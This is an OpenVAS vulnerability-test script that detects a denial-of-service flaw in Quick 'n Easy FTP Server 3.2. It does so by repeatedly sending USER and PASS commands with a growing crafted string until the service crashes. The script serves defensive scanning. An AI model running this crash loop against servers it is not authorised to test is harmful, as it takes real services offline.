###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_quick_n_easy_login_dos_vuln.nasl 4704 2016-12-07 14:26:08Z cfi $
#
# Quick 'n Easy FTP Login Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G <veernedragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802003");
  script_version("$Revision: 4704 $");
  script_tag(name:"last_modification", value:"$Date: 2016-12-07 15:26:08 +0100 (Wed, 07 Dec 2016) $");
  script_tag(name:"creation_date", value:"2011-03-09 16:08:21 +0100 (Wed, 09 Mar 2011)");
  script_bugtraq_id(14451);
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_name("Quick 'n Easy FTP Login Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("find_service_3digits.nasl");
  script_require_ports("Services/ftp", 21);

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16260");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98782");

  tag_impact = "Successful exploitation will allow the remote attackers to cause
  a denial of service.

  Impact Level: Application";

  tag_affected = "Quick 'n Easy FTP Server Version 3.2, other versions may also
  be affected.";

  tag_insight = "The flaw is due to the way server handles 'USER' and 'PASS'
  commands, which can be exploited to crash the FTP service by sending 'USER'
  and 'PASS' commands with specially-crafted parameters.";

  tag_solution = "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.";

  tag_summary = "The host is running Quick 'n Easy FTP Server and is prone to
  denial of service vulnerability.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Confirm the Application installed
banner = get_ftp_banner(port:ftpPort);
if("Quick 'n Easy FTP Server" >!< banner){
  exit(0);
}

flag = 0;
craf_cmd = "";

for(i=0; i<15; i++)
{
  ## Open a Socket
  soc1 = open_sock_tcp(ftpPort);

  ## Exit if it's not able to open socket first time
  if(!soc1 && flag == 0){
    exit(0);
  }

  ## Server is crashed, If not able to open the socket
  if(!soc1)
  {
    security_message(ftpPort);
    exit(0);
  }

  ## Server is crashed, If Server is not responding
  resp = recv_line(socket:soc1, length:100);
  if("Quick 'n Easy FTP Server" >!< resp)
  {
    security_message(ftpPort);
    exit(0);
  }

  ## Construct and Send crafted packets
  craf_cmd +=  "aa" + "?";
  send(socket:soc1, data: 'USER '+ craf_cmd + '\r\n');
  recv_line(socket:soc1, length:100);
  send(socket:soc1, data: 'PASS '+ craf_cmd + '\r\n');
  resp = recv_line(socket:soc1, length:100);

  if("530 Not logged in, user or password incorrect!" >< resp)
  {
    soc = open_sock_tcp(ftpPort);
    close(soc);
  }
}
